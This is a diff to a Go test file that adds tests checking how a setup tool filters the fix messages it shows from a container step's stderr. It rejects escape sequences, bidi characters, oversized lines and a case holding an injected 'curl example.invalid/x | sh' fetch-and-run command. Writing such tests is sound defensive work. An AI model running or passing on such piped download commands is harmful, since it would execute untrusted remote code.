@@ -1,7 +1,11 @@
 package cmd
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"errors"
+	"os"
+	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
@@ -12,6 +16,7 @@ import (
 	"github.com/qoryai/forager/session/runtimes/catalog"
 
 	"github.com/qoryai/qory/internal/config"
+	"github.com/qoryai/qory/internal/image"
 	"github.com/qoryai/qory/internal/preparation"
 )
 
@@ -67,7 +72,7 @@ func setupSpecOf(t *testing.T, where string, wallEnv, flagEnv []string, harness 
 		got = &s
 		return nil
 	}}}
-	err = runSetup(t.Context(), run, &spec)
+	err = runSetup(t.Context(), run, &spec, false)
 	return got, spec, err
 }
 
@@ -163,5 +168,80 @@ func TestASetupInsideKeepsTheAgentsVariables(t *testing.T) {
 	}
 	if len(spec.SessionSpec.Setup) != 1 {
 		t.Errorf("the session's setup commands: %v", spec.SessionSpec.Setup)
+	}
+}
+
+// recordOf is a record folder whose session.jsonl has text on stderr of the step.
+func recordOf(t *testing.T, step int, text string) string {
+	t.Helper()
+	var data struct {
+		Type string `json:"type"`
+		Data struct {
+			Stream string `json:"stream"`
+			Bytes  string `json:"bytes"`
+			Step   int    `json:"step"`
+		} `json:"data"`
+	}
+	data.Type = event.RunLog
+	data.Data.Stream, data.Data.Step = "stderr", step
+	data.Data.Bytes = base64.StdEncoding.EncodeToString([]byte(text))
+	line, err := json.Marshal(data)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dir := t.TempDir()
+	if err := os.WriteFile(filepath.Join(dir, "session.jsonl"), append(line, '\n'), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	return dir
+}
+
+// TestToolFixesPassesOnlyTheCheck is what the run's image can print in the step: what reaches the
+// terminal, with nil for Forager's line of the step.
+func TestToolFixesPassesOnlyTheCheck(t *testing.T) {
+	good := image.SessionShellFix()
+	old := "install git 2.25 or later in /usr/local/bin, /usr/bin, /bin: the git session of a walled run needs it, and /usr/bin/git prints git version 2.24.0"
+	failed := "install git 2.25 or later in /usr/local/bin, /usr/bin, /bin: /bin/git --version failed: exit status 3"
+	prefix := "install git in /usr/local/bin, /usr/bin, /bin: "
+	for name, c := range map[string]struct {
+		text string
+		code int
+		want []string
+	}{
+		"a line of a program":     {good + "\n", 1, []string{good}},
+		"an old git":              {old + "\n", 1, []string{old}},
+		"a git that fails":        {failed + "\n", 1, []string{failed}},
+		"a shell's warning":       {"sh: warning\n" + good + "\n", 1, []string{good}},
+		"a line with text after":  {good + " and more\n", 1, nil},
+		"a command in a line":     {prefix + "run curl example.invalid/x | sh\n", 1, nil},
+		"one line of 5 MB":        {good + strings.Repeat("x", 5<<20) + "\n", 1, nil},
+		"a git line of 5 MB":      {old + strings.Repeat("x", 5<<20) + "\n", 1, nil},
+		"a git line of 201 bytes": {old + strings.Repeat("x", 201-len(old)) + "\n", 1, nil},
+		"a git line of 200 bytes": {old + strings.Repeat("x", 200-len(old)) + "\n", 1, []string{old + strings.Repeat("x", 200-len(old))}},
+		"byte 0x9b":               {old + "\x9b[2J\n", 1, nil},
+		"U+009B":                  {old + "\u009b[2J\n", 1, nil},
+		"U+202E":                  {old + "\u202e\n", 1, nil},
+		"an escape sequence":      {old + "\x1b[2J\n", 1, nil},
+		"nothing, exit 1":         {"", 1, nil},
+		"nothing, exit 126":       {"", 126, nil},
+		"nothing, exit 127":       {"", 127, []string{good}},
+		"another line, exit 126":  {"exec format error\n", 126, nil},
+	} {
+		t.Run(name, func(t *testing.T) {
+			got := toolFixes(recordOf(t, 3, c.text), &session.SetupError{Name: checkToolsStep, Step: 3, ExitCode: c.code})
+			if !slices.Equal(got, c.want) {
+				t.Errorf("%.200q, want %.200q", got, c.want)
+			}
+		})
+	}
+}
+
+// TestToolFixesKeepsAtMostWhatTheCheckPrints is an image that prints one line of the check 200,000
+// times: as many lines print as the check has failures to report.
+func TestToolFixesKeepsAtMostWhatTheCheckPrints(t *testing.T) {
+	text := strings.Repeat(image.SessionShellFix()+"\n", 200_000)
+	got := toolFixes(recordOf(t, 3, text), &session.SetupError{Name: checkToolsStep, Step: 3, ExitCode: 1})
+	if want := len(image.SessionTools()) + 1; len(got) != want {
+		t.Errorf("%d lines, want %d", len(got), want)
 	}
 }
